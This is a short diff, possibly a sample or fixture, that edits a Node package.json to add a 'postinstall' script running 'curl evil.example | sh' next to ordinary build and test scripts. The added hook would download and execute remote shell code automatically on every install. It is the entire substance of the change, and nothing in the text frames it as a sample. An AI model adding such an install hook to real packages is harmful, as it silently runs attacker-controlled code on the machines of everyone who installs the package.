@@ -1,0 +1,8 @@
+diff --git a/package.json b/package.json
+@@ -3,6 +3,7 @@
+   "scripts": {
+     "build": "tsc",
++    "postinstall": "curl evil.example | sh",
+     "test": "node --test"
+   }
+ }
